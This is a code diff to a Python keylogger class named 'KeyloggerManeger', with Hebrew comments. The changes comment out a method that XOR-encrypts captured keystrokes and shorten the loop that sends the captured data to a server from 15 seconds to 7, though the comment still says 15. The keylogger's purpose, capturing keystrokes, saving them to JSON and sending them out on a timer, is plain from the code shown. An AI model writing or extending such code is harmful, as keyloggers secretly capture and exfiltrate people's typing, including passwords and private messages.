@@ -14,13 +14,13 @@ class KeyloggerManeger:
 
 
     def getdata(self):
-       # return  self.keylogger.data
-       return self.file_writer.save_to_json(self.keylogger.data)
+        # return  self.keylogger.data
+        return self.file_writer.save_to_json(self.keylogger.data)
 
 
-    def crypt_data(self):
-        encrypted_data = self.encrypt.xor(self.getdata())  # שמירת הפלט של ההצפנה
-        return encrypted_data
+    #def crypt_data(self):
+     #   encrypted_data = self.encrypt.xor(self.getdata())  # שמירת הפלט של ההצפנה
+      #  return encrypted_data
 
     def send_data_to_server(self):
 
@@ -32,7 +32,7 @@ class KeyloggerManeger:
     def f(self):
         try:
             while True:
-                time.sleep(15)  # כל 15 שניות שולח נתונים
+                time.sleep(7)  # כל 15 שניות שולח נתונים
                 self.send_data_to_server()
         except KeyboardInterrupt:
             print("Keylogger stopped.")
